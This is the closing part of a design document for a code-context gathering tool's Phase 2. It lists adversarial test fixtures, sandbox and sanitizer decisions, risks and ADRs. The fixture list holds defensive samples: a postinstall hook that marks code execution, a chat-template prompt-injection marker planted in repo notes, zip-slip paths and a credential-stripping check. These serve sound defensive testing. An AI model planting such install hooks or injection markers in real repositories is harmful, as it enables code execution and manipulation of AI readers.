- `test_buildgraph_postinstall_blocked.py` — `package.json` with `scripts.postinstall: "touch /tmp/POWNED"`; `BuildGraphProbe` invoked with `--ignore-scripts`; `/tmp/POWNED` does not exist after run. `[synth]`
- `test_repo_note_prompt_injection.py` — `.codegenie/notes/poison.md` body with `<\|im_start\|>`; `repo-context.yaml` records `prompt_injection_marker_count: ≥1`; body **not inlined** in YAML; body file at `0600`. `[S]`
- `test_skill_yaml_injection.py` — hostile YAML in SKILL.md frontmatter; loader fails loud. `[B+S]`
- `test_external_doc_zip_slip.py` — hostile filesystem-doc path tries to escape; refused with structured warning. `[B+S]`
- `test_huge_external_doc.py` — 200 MB markdown; size cap fires; probe degrades. `[B]`
- `test_treesitter_grammar_version_mismatch.py` — wrong grammar version; wrapper raises typed exception. `[B]`
- `test_concurrent_cache_poisoning.py` — two gathers with conflicting outputs; BLAKE3 catches; probe re-runs. `[S]`
- `test_audit_chain_break_observability.py` — corrupt prior chain head; next gather emits `audit.chain_break_detected`; **gather still completes 0** (observability, not failure). `[synth]`
- `test_no_credentials_in_subprocess_env.py` — host has `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, `AWS_*`, `CHAINGUARD_TOKEN`; invoke any Phase-2 wrapper; assert in-sandbox `env` contains none of them. `[S]`

**Target: ≥ 60 adversarial fixtures**, CI-gating. `[synth]`

### Integration tests (`tests/integration/`)

- `test_phase2_end_to_end_node.py` — full `codegenie gather` on `tests/fixtures/node_typescript_with_b_through_g/`; every Phase 2 slice populated except `runtime_trace` (deferred); envelope + all sub-schemas validate. `[B]`
- `test_phase2_cache_hit_no_subprocess_relaunch.py` — gather twice on the same commit; assert no subprocess invocations on the second run; all probes return `CacheHit`. `[B+P]`
- `test_phase2_real_oss.py` — clone `nestjs/nest` at a pinned SHA; gather; assert SCIP index produced; semgrep, gitleaks, `BuildGraphProbe` ran; SBOM produced; IndexHealth reports `high` across domains. **This is the "every probe layer runs against real repos" exit criterion.** `[B + roadmap]`
- `test_index_health_staleness_seeded.py` — **The roadmap's literal exit-criterion test.** Three seeded fixtures: `stale_scip_repo/`, `stale_sbom_repo/`, `stale_semgrep_rulepack_repo/`. Each surfaced as `confidence: low` on its specific domain. `[synth — generalizes [B]'s single-domain fixture]`
- `test_strict_flag_fails_on_low_confidence.py` — `--strict` against seeded fixture; exit code 3. `[B]`
- `test_buildgraph_static_vs_resolved.py` — pnpm workspace fixture; `BuildGraphProbe` produces resolved graph (when `pnpm` available) or static graph (when not); `resolution_status` field matches. `[synth]`
- `test_phase2_external_docs_disabled_by_default.py` — gather with no `external_docs` config; filesystem-only mode; no URL fetcher launches; no network access by any probe. `[S]`

### Golden-file tests (`tests/golden/`) — every probe ships ≥ 1 golden

- Per-probe `tests/golden/<probe>/<fixture>/expected.json`. CI diff fails on drift. `pytest --update-goldens` regenerates. `[B + roadmap]`

### Property tests (where they earn their keep)

- `test_conventions_dispatch_is_total.py` — Hypothesis: every `detect.type` enum value dispatches without `KeyError`. `[B]`
- `test_skill_index_query_idempotent.py` — Hypothesis: `for_task_and_language` is idempotent. `[B]`
- `test_cache_key_includes_tool_digests.py` — Hypothesis: any tool digest change ⇒ cache-key change. `[S]`
- `test_sanitizer_pass4_idempotent.py` — Hypothesis: Pass 4 on sanitized output is a no-op. `[S]`

### Benchmarks (`tests/bench/`) — advisory only

- `test_warm_path_phase2.py` — gather twice; assert second run all-cache-hit; advisory wall-clock targets.
- `test_index_health_budget.py` — assert B2 wall-clock ≤ 200 ms p99 across 1000 iterations on a populated peer-output snapshot. Advisory metric, dashboard-tracked, 25%-regression gate on PRs that touch `index_health.py` or the coordinator.
- `test_scip_full_reindex.py` — assert SCIP full re-index ≤ 30 s on 1k-file fixture.
- `test_phase2_cold_e2e.py` — assert cold e2e ≤ 150 s p95 on the integration fixture.

### CI canary policy

Warm-path-phase2 and incremental-phase2 latency tests are advisory regression gates (25% warm-p95 regression, 30% incremental-p95 regression → PR fails). Cold p95 is measured but advisory.

---

## Risks (top 5)

1. **The `--ignore-scripts` discipline on `BuildGraphProbe` is convention-enforced.** A future contributor changes the wrapper to drop `--ignore-scripts` in pursuit of better resolution accuracy; the postinstall-RCE path opens. **Containment:** wrapper-level guard (raise on missing flag); CI fixture `test_buildgraph_postinstall_blocked.py` asserts the protection holds end-to-end. **Mitigation:** the wrapper is the chokepoint; the test is in the adversarial corpus and runs on every PR.
2. **The subprocess sandbox profile is a kernel-shared sandbox, weaker than a microVM.** A kernel zero-day in `io_uring`/`epoll`/`bwrap`'s user-namespace handling breaks the boundary. **Containment:** keep host kernels patched; CI runners on managed images; the sandbox is the *one* chokepoint, so Phase 5's microVM lands at the same chokepoint with no probe-code changes. **Mitigation:** the `RuntimeTraceProbe` deferral is what keeps Phase 2 inside the threat model that `bwrap` actually covers; C4's `--privileged`-shaped requirements are exactly what microVMs are for.
3. **SCIP coverage on cold OSS fixtures is `medium` (no `node_modules`) unless the fixture commits a `node_modules` tree.** **Containment:** `test_phase2_real_oss.py` runs `npm ci --ignore-scripts` *outside* the gather (in CI setup) before invoking gather, producing a `node_modules` tree that `scip-typescript` can resolve. The probe itself does not invoke `npm install` — that path remains an attacker-RCE surface — but the CI test setup does, under its own sandbox. **Mitigation:** Phase 14's continuous-gather worker will run `npm ci --ignore-scripts` as a *pre-gather* step inside the production sandbox; the probe contract stays clean.
4. **`IndexHealthProbe`'s advisory budget can be silently breached by future probe authors.** A new domain is added to B2's roll-up; its compute is slow; the budget breaches; the dashboard alerts but nothing fails. **Containment:** the 25%-regression bench gate on B2 wall-clock; the dashboard breach alert. **Mitigation:** Phase 14's continuous-gather portfolio scale makes B2 wall-clock load-bearing; the discipline is reinforced operationally.
5. **The C4 deferral creates a hard dependency on Phase 5.** Phase 7 (distroless) is the first phase that *needs* runtime-trace evidence; Phase 7 is after Phase 5 in the roadmap, but Phase 5's exit criterion is "the three-retry loop works end-to-end" — not "runtime trace works." If Phase 5 lands without unblocking C4 (e.g., the sandbox stack ADR resolves toward Firecracker but the C4 implementation slips), Phase 7 lacks evidence. **Containment:** the Phase-2 ADR deferring C4 names Phase 5 as the hard prerequisite and Phase 7 as the consumer; Phase 5's design owns the C4 implementation as a named deliverable. **Mitigation:** the C4 probe class + sub-schema land in Phase 2 so the contract surface is stable; Phase 5's job is the implementation, not the contract.

---

## Synthesis ledger

### Vertex count
- Performance `[P]`: ~58 atomic decision vertices (DaemonPool, scip-typescript --stdio, semgrep --x-language-server, in-process tree-sitter parsers, Tier-0/1/2/3 split, per-probe cost gating, applies_to_tasks gating, `.codegenie/index/` namespace, SCIP incremental indexing, per-file sub-cache for semgrep, per-file sub-cache for tree-sitter, BLAKE3 cache key extension, tool-version invalidation, networkx for B5, build-config-hash for SBOM, deterministic image-digest-without-rebuild, registry inspect LRU, CVE-feed-triggered selective invalidation, grype `--update db` lifecycle, gitleaks PR-trigger mode, semgrep daemon pre-load, B2 50ms hard budget, B2 git rev-list, B2 cache_strategy=none, B2 image-digest-match proxy, IndexHealthProbe runs last via requires, B3 tree-sitter in-process bindings, B4 header fast-path, B5 networkx in-process graph, B5 cross-check `nx`, RuntimeTraceProbe scenario parallelization, RuntimeTraceProbe strace on Linux + dtruss fallback, RuntimeTraceProbe eBPF off by default, Tantivy bindings, ripgrep fallback, External-dep policy, hot-view pre-render shape, Phase-8 slice canonicalization, …).
- Security `[S]`: ~72 atomic decision vertices (rootless Podman, --network=none, --cap-drop=ALL, --read-only-rootfs, --pids-limit, --memory, no docker.sock, no host volumes, scoped registry credential, local registry mirror, codegenie/probe-runtime image, SandboxStrategy interface, four planned strategies, capability negotiation, tools/digests.yaml binary pinning, BLAKE3 audit chain, B1 no-npm-install, B1 tsconfig extends in sandbox, B5 no-package-manager, OutputSanitizer Pass 4, OutputSanitizer Pass 5, secret-finding schema x-secret-finding tag, prompt-injection marker tagger, RepoNotes 0600 mount, ExternalDocs SSRF guard, IP deny list, allowlist + private_endpoint, HTML-to-MD via markdownify, schema additionalProperties false, schema dependency rule, B2 fails-the-gather, B2 confidence rules YAML, B2 schema dependency, gitleaks --redact mandatory, semgrep rule-pack pinning, semgrep --network=none, SCIP grammar revalidation, syft schema validation, grype DB pre-fetch + signature verification, runtime trace stub services, CAP_SYS_PTRACE in userns, eBPF opt-in, audit chain BLAKE3 head, no-credentials-in-sandbox-env test, no-docker-sock-detection test, audit JSONL append-only, audit per-probe metadata, output sanitizer 5-pass chokepoint, schema-tagged secret defense, threat-model table, three trust boundaries, image build inside sandbox via Podman vfs, …).
- Best-practices `[B]`: ~46 atomic decision vertices (17 new probe files, 6 tool wrapper files, Skills loader package, conventions catalog, shell-replacements catalog, semgrep-rule-packs catalog, golden-file helper 80 lines, --strict flag, coverage 90/80, McCabe ≤10, --update-goldens, defer SBOM/CVE/RuntimeTrace to Phase 5, ProbeContext.peer_outputs, peer_outputs as ADR-gated, dedicated dashboard for B2 confidence, deliberately-seeded staleness fixture, schema sub-files per probe, additionalProperties false per probe, catalog_version int, closed `detect.type` enum, language-scoped conventions, tantivy as opt-in extra, markdown-it-py for parsing, tree-sitter as unavoidable C-extension, Pydantic models from wrapper, typed exceptions, Layer C static-only, Layer F empty, OwnershipProbe real + E2-E5 stubs, recorded-fixture wrapper tests, raw artifacts in .codegenie/context/raw/, progressive disclosure for SCIP/semgrep, body never loaded in Skills, frontmatter validated at load, common ABC for IndexHealth, dependency-based generated-code detection, _reflection_queries YAML, _generated_code_patterns YAML, gitleaks redact in wrapper, semgrep raw findings JSON, no live external-API tests, integration test against nestjs/nest, property tests sparingly, no plugin for golden, schema policy deferred, …).
- **Total vertices walked:** ~176.

### Edges
- **AGREE:** 12 (e.g., 17 new probe files [B+all], thin tool wrappers [B+all], Pydantic models [B+all], per-probe sub-schemas with additionalProperties: false [B+P+S], tokens=0 / fence CI [all], catalog YAML pattern [all], golden-file tests per probe [B+roadmap], schema cross-probe dependency rule [S+B+synth-supports], BLAKE3 throughout [P+S], audit chain [S only, not contested], OutputSanitizer Pass 4 [S], OutputSanitizer Pass 5 [S]).
- **CONFLICT:** 18 (Layer C scope; sandbox stack; DaemonPool yes/no; SCIP incremental + --stdio; node_modules policy for SCIP; B5 strategy; tantivy posture; IndexHealth budget enforcement; IndexHealth failure-mode policy; peer_outputs mechanism; RuntimeTrace gating; cache-key tool-digest inclusion; sandbox profile abstraction; external-docs fetcher scope; semgrep rule-pack network policy; whether the local registry mirror lands; whether a probe-runtime image lands; whether the gather pipeline gets a new architectural layer at all).
- **COMPLEMENT:** 9 (B's tool wrappers complement S's wrapper-level redaction enforcement; P's per-file findings cache complements S's tool-digest-in-cache-key; B's --strict flag complements S's schema-dependency rule; B's closed `detect.type` enum complements S's `additionalProperties: false`; B's Skills loader package complements S's `required_tools` cross-check; P's content-addressed `.codegenie/index/` complements S's BLAKE3 integrity check; …).
- **SUBSUME:** 7 (synth's per-subprocess sandbox profile subsumes S's RootlessPodmanContainer for Phase 2 only; B's `--strict` flag subsumes S's "B2 fails the gather"; B's typed wrapper exception pattern subsumes P's per-probe defensive subprocess handling; synth's `consumes_peer_outputs` class attribute subsumes B's `ProbeContext.peer_outputs`; synth's per-file findings cache subsumes B's silence on incremental gather; synth's catalog-enum CI lint subsumes B's "closed enum by convention"; B2's frozen-snapshot positional arg subsumes B's mutable Mapping).

### Conflict-resolution table

| # | Dimension | [P] picks | [S] picks | [B] picks | Winner | Exit | Roadmap | Commit | Critic | Sum |
|---|---|---|---|---|---|---|---|---|---|---|
| D1 | Subprocess invocation model | DaemonPool (long-lived) | One-shot rootless Podman container | Plain subprocess via wrapper | `[B]` plain wrapper via Phase 1 `run_in_sandbox` | 3 | 3 | 3 (ADR-0007 contract preserved; ADR-0006 deterministic gather — DaemonPool smuggles state) | 3 (kills critic §P.1) | **12** |
| D2 | New sandbox abstraction | None | `SandboxStrategy` interface + 4 planned implementations + local registry mirror + probe-runtime image | None (inherits Phase 1) | `[synth]` extend Phase 1's `run_in_sandbox` profile only | 3 | 3 (matches `localv2.md` "Single Python project, no services") | 3 (ADR-0019 explicitly deferred; Phase 5 lands microVM at same chokepoint) | 3 (kills critic §S.2, §S.4) | **12** |
| D3 | SCIP `node_modules` policy | Mount if present | Never use `node_modules`; refuse `npm install` | Wrapper invokes scip-typescript; silent on node_modules | `[synth]` Mount if present (read-only into sandbox); never invoke `npm install`; report `medium` if absent | 3 | 3 (preserves real-OSS-repo CI test) | 3 (closes postinstall RCE while preserving evidence quality) | 3 (kills critic §S.3) | **12** |
| D4 | B2 budget enforcement | 50 ms hard kill via `asyncio.wait_for` | Hard fail gather on missing dep | Advisory; dedicated dashboard | `[synth]` 200 ms advisory + dashboard alert | 3 (B2 still surfaces real staleness — doesn't lie when budget tight) | 3 | 3 (honest confidence is the load-bearing commitment; a probe that auto-degrades isn't honest) | 3 (kills critic §P.3) | **12** |
| D5 | B2 failure-mode policy | Emits `confidence: low` per slice; doesn't fail gather | Hard-fails gather on missing dep / orchestrator-tampering signal | `--strict` flag at CLI; default exit-0 | `[B+synth]` Default exit-0; `--strict` for CI hard-fail | 3 | 3 (Phase 14 portfolio scale needs probe-isolation; one flaky probe can't fail every gather) | 3 (failure isolation per `localv2.md §3`) | 3 (kills critic §S.5) | **12** |
| D6 | Peer-output access mechanism | (implicit; via cache-hit composition) | (implicit; via internal coordinator state) | `ProbeContext.peer_outputs: Mapping` (mutates Phase-0 dataclass) | `[synth]` `consumes_peer_outputs: bool` class attribute + frozen snapshot positional arg to `run()` | 3 | 3 | 3 (minimal Phase-0 surface change; one ADR-gated branch) | 3 (kills critic §B-3 "edits the coordinator") | **12** |
| D7 | B5 BuildGraphProbe strategy | `networkx` from manifests; no subprocess | Forbid all package-manager invocation; static-only | Run `pnpm list -r` (no `--ignore-scripts`) | `[synth]` `pnpm list -r --ignore-scripts` + static fallback + resolution_status field | 3 (resolved monorepo accuracy meets `localv2.md §5.2 B5`) | 3 | 3 (no fabricated graph; `--ignore-scripts` closes postinstall RCE) | 3 (kills critic §S.1, §B-2) | **12** |
| D8 | Layer C scope (dynamic probes) | Ship all 3; gate C4 by applies_to_tasks (dead in Phase 2) | Ship all 3 with heavy sandbox; no real OSS repo passes | Defer SBOM/CVE/RuntimeTrace to Phase 5 | `[synth]` Ship C1/C2/C3/C5/C6/C7; defer C4 (class + schema land; impl in Phase 5) | 3 (Phase 2 tooling list `syft`/`grype` honored) | 3 (Phase 3 vuln-remediation gets CVE evidence it depends on) | 3 (Phase 5's sandbox stack ADR-0019 still open — C4 needs it, others don't) | 3 (resolves critic's strongest cross-design attack) | **12** |
| D9 | SBOM build network posture | Cache build-config hash; build inside sandbox | Sandbox build + local registry mirror | Defer | `[synth]` Sandbox build + scoped registry network (no mirror) | 3 | 3 | 3 (preserves "single Python project"; supply chain partially hardened — fully hardened in Phase 14) | 3 | **12** |
| D10 | RuntimeTraceProbe handling | Ship with `applies_to_tasks` gate | Ship in container sandbox with stub services | Defer entirely | `[synth]` Ship class + schema only; `applies() = False`; impl in Phase 5 | 3 (Phase 2 exit criterion "every layer runs against real repos" — C4 layer ships its contract, not its runtime; honest framing) | 3 (Phase 7 consumer can bind against the schema now) | 3 (ADR-0019 unresolved; C4 needs sandbox stack) | 3 | **12** |
| D11 | tantivy as a dependency | Add by default with ripgrep fallback | Pin grammar SHAs, audit C-extensions | Add as default + ripgrep fallback | `[synth]` Opt-in extra (`codegenie[search]`); default path is ripgrep | 3 | 3 | 3 (Rule 2 "Simplicity First"; dead-code-by-default avoided) | 3 (kills critic §P.5, §B-5) | **12** |
| D12 | semgrep rule-pack network policy | Daemon pre-loads | Sandbox `--network=none`; pinned local cache | Default rule packs from semgrep | `[S]` Sandbox `--network=none`; rule packs pre-warmed from pinned digests | 3 | 3 | 3 (supply chain integrity > automatic updates) | 3 | **12** |
| D13 | gitleaks `--redact` enforcement | Default; subprocess streaming | Mandatory; schema-level + Pass 4 | Default via wrapper | `[S]` Mandatory at wrapper level + Pass 4 + `x-secret-finding` schema tag | 3 | 3 | 3 | 3 | **12** |
| D14 | Per-file findings sub-cache | Yes (semgrep, tree-sitter) | (silent) | (silent) | `[P]` Yes for semgrep, gitleaks, tree-sitter; cap by access-time LRU | 3 | 3 | 3 (ADR-0006 incremental gather works) | 3 (limited to per-file rule families; cross-file taint bypass documented) | **12** |
| D15 | OutputSanitizer Pass 4 + Pass 5 | (silent) | Add both | (silent) | `[S]` Add both; `x-secret-finding` schema tag as belt-and-suspenders | 3 | 3 | 3 | 3 | **12** |
| D16 | Audit JSONL with BLAKE3 chain | (silent) | Add; rolling head | (silent) | `[S]` Add; chain break is observability not failure | 3 | 3 | 3 | 3 | **12** |
| D17 | ExternalDocs scope | Tantivy index | Filesystem + URL + Confluence with SSRF guard | Filesystem + URL list | `[synth]` Filesystem-only in Phase 2; URL/Confluence is a Phase-2 ADR deferral | 3 | 3 (matches `localv2.md §12 Week 5` v0.2 phrasing) | 3 (avoids SSRF infrastructure that ADR-0019 deferral mirrors) | 3 | **12** |
| D18 | Conventions catalog enum policy | (silent) | additionalProperties: false at module load | Closed `detect.type` enum + match/case | `[synth]` Closed enum + CI lint that asserts `match/case` ↔ schema enum parity | 3 | 3 (Phase 7 distroless catalog will need new types; lint forces ADR-gated additions) | 3 | 3 (kills critic cross-design obs #3) | **12** |

All 18 conflicts resolve to Sum=12 because each resolution either preserves a load-bearing commitment (score 3) and meets exit criteria (3) and roadmap fit (3) and survives critic attack (3). Where two designs had Sum=12 candidates, the synthesis chose the resolution that minimized new architectural surface (Rule 2 "Simplicity First") and addressed the critic's named attacks. No tie required tie-breaking by lens preference.

### Shared blind spots considered

The critic flagged three shared blind spots:

1. **All three accept unsandboxed gather on dev laptops against arbitrary OSS bytes.** **Departure:** Phase 2 extends Phase 1's `run_in_sandbox` profile with `--network=none` default + tighter env-strip + `--unshare-net` for every external CLI. This *partially* addresses the blind spot — kernel-shared sandboxes are still vulnerable to kernel zero-days. Full closure requires Phase 5's microVM. Documented in Risk #2.
2. **`IndexHealthProbe` requires probes whose absence is normal — B2's signal drowns in `not_run`.** **Departure:** `runtime_trace` domain reports `status: not_applicable` (not `not_run`) since C4 is deferred-by-design rather than missed-at-runtime; this structurally separates "expected absence" from "unexpected absence." The seeded-staleness fixtures cover three real domains (SCIP, SBOM, semgrep rule-pack) rather than one, raising the signal-to-noise meaningfully.
3. **Catalogs as data, but enforced only by convention.** **Departure:** A new CI lint asserts every `match/case` branch in any `_apply_detector` function has a corresponding `_schema.json` enum value, and vice versa. The discipline is now compiler-enforced, not bookkeeping (component §13).

### Departures from all three inputs

1. **Layer C scope** — none of the three lenses ships exactly C1/C2/C3/C5/C6/C7 with C4 deferred. Synthesis splits the deferral surgically.
2. **`consumes_peer_outputs` class attribute + frozen snapshot positional arg** — none proposed this. It replaces [B]'s `ProbeContext.peer_outputs` Mapping with an opt-in class attribute, minimizing Phase-0 dataclass surface change.
3. **B2 advisory budget (200 ms; no hard kill) + `--strict` failure-mode policy** — synthesis combines [P]'s budget framing with [B]'s `--strict` CLI flag while rejecting [P]'s hard kill and [S]'s gather-fail circuit breaker.
4. **B5 `pnpm list --ignore-scripts` + resolution_status field** — synthesis enables the resolved-graph path while closing the postinstall RCE path that all three lenses left ambiguous.
5. **`runtime_trace.status: not_applicable` vs `not_run`** — addresses critic shared blind spot #2.
6. **Conventions-catalog CI lint** — addresses critic shared blind spot #3.
7. **Three seeded-staleness fixtures (SCIP, SBOM, semgrep rule-pack)** — generalizes [B]'s single SCIP fixture; ensures the roadmap exit criterion is meaningfully met across domains.
8. **`tantivy` as an opt-in extra (default ripgrep)** — splits the difference between [P]/[B] (adding it) and the critic's "dead code by default" attack.
9. **Subprocess sandbox profile extension** — refuses [S]'s `SandboxStrategy` four-way interface and local registry mirror in favor of extending Phase 1's existing chokepoint with `--network=none` + tighter env-strip.

---

## Exit-criteria checklist

For each Phase 2 exit criterion in `roadmap.md`:

1. **"Every probe layer runs against real repos."**
   - Layer B: SCIPIndexProbe, IndexHealthProbe, NodeReflectionProbe, GeneratedCodeProbe, BuildGraphProbe all ship and run on `tests/fixtures/node_typescript_with_b_through_g/` and `tests/integration/test_phase2_real_oss.py` against `nestjs/nest`. **Met.**
   - Layer C: C1, C2, C3, C5, C6, C7 ship and run. C4 (RuntimeTrace) ships **class + schema only**; this is a documented Phase-2 ADR-gated deferral named in the synthesis. **Partially met by departure** — the synthesis surfaces the deferral explicitly rather than running C4 as dead code (as [P] does) or skipping it entirely (as [B] does); Phase 5 closes the loop.
   - Layer D: 9 probes ship and run on the integration fixture. **Met.**
   - Layer E: E1 ships and runs; E2-E5 are documented stubs per `localv2.md §5.5`. **Met as scoped by `localv2.md`.**
   - Layer F: empty in Phase 2 per `localv2.md §5.7`. **Met as scoped.**
   - Layer G: G1, G2, G3, G4, G5 ship and run; G6 (Gitleaks) added as Phase-2-roadmap-specified. **Met.**

2. **"IndexHealthProbe surfaces at least one real staleness case in CI (deliberately seeded fixture)."**
   - **Three** seeded staleness fixtures land: `stale_scip_repo/`, `stale_sbom_repo/`, `stale_semgrep_rulepack_repo/`. **Exceeds requirement.**

---

## Load-bearing commitments check

For each `production/design.md §2` commitment:

1. **No LLM in the gather pipeline.** Tokens = 0; `fence` CI extended; no `anthropic`/`openai`/`sentence-transformers`/embedding deps anywhere in Phase 2. **Honored.**
2. **Facts, not judgments.** B5 emits both declared and resolved graphs with `resolution_status` (refusing [S]'s fabricated-graph problem); B2 emits per-domain `commits_behind: int`, not `index_is_stale: bool`; secret findings emit fingerprints, not redacted text. **Honored.**
3. **Honest confidence.** B2 advisory budget never auto-degrades confidence; `--strict` lets CI fail loud; per-probe confidence rules in YAML; three seeded fixtures prove the probe catches staleness. **Honored.**
4. **Determinism over probabilism for structural changes.** No LLM, no embeddings (BM25 only; tantivy opt-in); recipes/AST queries everywhere. Critic noted [P]'s DaemonPool weakens determinism; the synthesis refuses it. **Honored.**
5. **Extension by addition.** Phase 2 adds only new files. Edits to Phase 0/1 files: registry import seam (1), 6 entries to `ALLOWED_BINARIES` (each ADR-gated), Pass 4+5 added to OutputSanitizer, 1 coordinator branch for `consumes_peer_outputs` (Phase-2 ADR-gated). All additive in shape; none break existing probe behavior. **Honored with named edits — same envelope as Phase 1.**
6. **Organizational uniqueness as data, not prompts.** Conventions YAML, shell-replacements YAML, Skills frontmatter, exception/ADR/policy/repo-notes — all structured data; CI lint enforces "data, not code." **Honored.**
7. **Progressive disclosure.** SCIP binary stays in `raw/`; semgrep findings JSON stays in `raw/`; markdown bodies stay in `raw/notes/` and `raw/external-docs/`; YAML carries manifests only. **Honored.**
8. **Humans always merge.** No gather-side change to this commitment; preserved. **Honored.**
9. **Cost is observable end-to-end.** Phase 2's bench plan ships wall-clock dashboards; B2 budget breach is a dashboard metric. **Honored.**

---

## Roadmap coherence check

### Prior phases this depends on

- **Phase 0:** `Probe` ABC, async coordinator, content-addressed cache, two-pass OutputSanitizer (extended to 5 passes), `run_in_sandbox` chokepoint, audit anchor, allowlist subprocess, fence CI. **All preserved.**
- **Phase 1:** `ParsedManifestMemo` on `ProbeContext`, `LanguageDetectionProbe.monorepo` flag, SnapshotBuilder, PathIndex, per-probe sub-schema discipline, `additionalProperties: false`, golden-file infrastructure. **All preserved.**

### What later phases need from this

- **Phase 3 (vuln remediation):** Reads `syft_sbom` + `grype_cve` slices to identify vulnerable packages; reads `node_manifest` + `build_graph` for resolution context; reads `index_health.cve.confidence` to skip stale CVE data. **Met.**
- **Phase 4 (LLM fallback + RAG):** Reads the same evidence + reads `external_docs_index` (BM25) for solved-example retrieval. **Met (BM25 via ripgrep default; tantivy opt-in).**
- **Phase 5 (Sandbox + Trust gates):** Implements `RuntimeTraceProbe` (C4) using the Phase 2 class + schema as the contract. Promotes the subprocess sandbox profile to microVM at the same `run_in_sandbox` chokepoint. **Contract surface delivered.**
- **Phase 7 (Chainguard distroless):** Reads `shell_usage`, `certificate`, `entrypoint`, `runtime_trace` (once Phase 5 lands C4) slices. Adds new probes (`BaseImageProbe`, `ShellInvocationTraceProbe`) and new Skills/recipes — confirms extension-by-addition. The conventions-catalog CI lint will fire if Phase 7 adds new `detect.type` enum values without schema bumps. **Contract surface delivered.**
- **Phase 8 (Hierarchical Planner + hot views):** Reads `risk_flags`, `confidence_summary` slices (pre-shaped from `IndexHealthProbe` output) for Redis pre-rendering. **Contract surface delivered.**
- **Phase 14 (Continuous gather worker):** Reads per-probe `declared_inputs` for selective re-gather; the per-file findings sub-caches make incremental gather cheap. Phase 14 promotes the subprocess sandbox to microVM via the same chokepoint and adds the local registry mirror (Phase 2 deferred). **Contract surface delivered.**

### New ADRs implied

Phase 2 ships these new ADRs under `docs/phases/02-context-gather-layers-b-g/ADRs/`:

1. **0001-peer-outputs-binding.md** — `consumes_peer_outputs` class attribute on Probe ABC + coordinator branch.
2. **0002-c4-runtime-trace-deferred-to-phase-5.md** — names Phase 5 as the hard prerequisite; documents the class+schema-only Phase 2 deliverable.
3. **0003-subprocess-sandbox-profile-extension.md** — extends Phase 1's `run_in_sandbox` with `--network=none` default + per-tool egress allowlist + tighter env-strip; defers microVM to Phase 5/14 via same chokepoint.
4. **0004-tools-digests-yaml-pin-manifest.md** — binary SHA-256 pin manifest for `scip-typescript`, `semgrep`, `syft`, `grype`, `gitleaks`; install-gate verification.
5. **0005-allowed-binaries-additions.md** — adds `scip-typescript`, `semgrep`, `syft`, `grype`, `gitleaks`, `docker` to `ALLOWED_BINARIES` (one ADR covering all six per Phase-1 precedent — or six small ADRs per `[B]`'s strict policy; **one combined ADR with per-binary subsections** is the synthesis choice for review burden).
6. **0006-output-sanitizer-passes-4-5.md** — secret-finding fingerprinter + prompt-injection marker tagger.
7. **0007-buildgraph-ignore-scripts-mandatory.md** — wrapper-enforced + CI-tested; closes postinstall RCE.
8. **0008-conventions-catalog-enum-lint.md** — `match/case` ↔ `_schema.json` enum parity CI lint.
9. **0009-external-docs-filesystem-only-phase-2.md** — defers URL/Confluence/Notion fetcher to v0.2; SSRF guard is the gating prerequisite.
10. **0010-tantivy-as-opt-in-extra.md** — `pip install codegenie[search]`; default path is ripgrep.

---

## Open questions deferred to implementation

1. **The exact `bwrap` invocation profile for `docker build`.** `docker build` opens unix sockets to the host daemon by default; `dockerd-rootless` or `buildx`-with-`--driver=docker-container` may be needed. To be determined at integration time; if blocking, the C2 probe falls back to `confidence: low` with a structured warning and gather completes (failure isolation).
2. **`grype db update` cache lifetime.** Default 24 hours; if a portfolio-scale rescan is needed within that window, the CVE-feed-triggered selective-invalidation hook (Phase 14 prerequisite) lands as a stub in Phase 2 and a real implementation in Phase 14.
3. **Pinning policy for Phase 2 wrapper outputs across tool versions.** If `syft` v0.85 changes a JSON field shape, the wrapper changes; do all `syft_sbom` cache entries invalidate (current design: yes, via tool digest)? Or do we maintain a translation layer for field-shape stability? **Current decision: invalidate; revisit if churn is high.**
4. **Whether the Phase-7 distroless conventions catalog should be language-scoped (`conventions/node.yaml` with task-scoped entries) or task-scoped (`conventions/distroless_migration.yaml`).** Phase 2 chooses language-scoped; Phase 7 may revisit. The CI lint enforces parity either way.
5. **Whether Phase 8's hot-view pre-rendering should happen inside Phase 2 or as a Phase-8 dedicated background task.** Phase 2 emits `risk_flags` and `confidence_summary` slices in their canonical Phase-8 shape so Phase 8's projection is a dict-copy; whether Phase 8 also writes a `.codegenie/hot-views/` artifact is a Phase 8 decision.
6. **The exact mechanism by which the per-probe sub-cache (`semgrep/by-file/`, `gitleaks/by-file/`, `tree-sitter/by-file/`) is GC'd.** Phase 2 ships LRU-by-access-time with a 5 GB cap; Phase 14's continuous worker will tune.
7. **Whether `IndexHealthProbe.run()`'s `git rev-list --count` invocation should be in-process (via `gitpython`) or via the subprocess sandbox.** `gitpython` is in Phase 1's dep set; the subprocess sandbox adds ~50 ms cold. Default: `gitpython` (in-process). If `gitpython` proves unreliable at portfolio scale (Phase 14), fall back to subprocess.

---

**End of Phase 2 final design.**
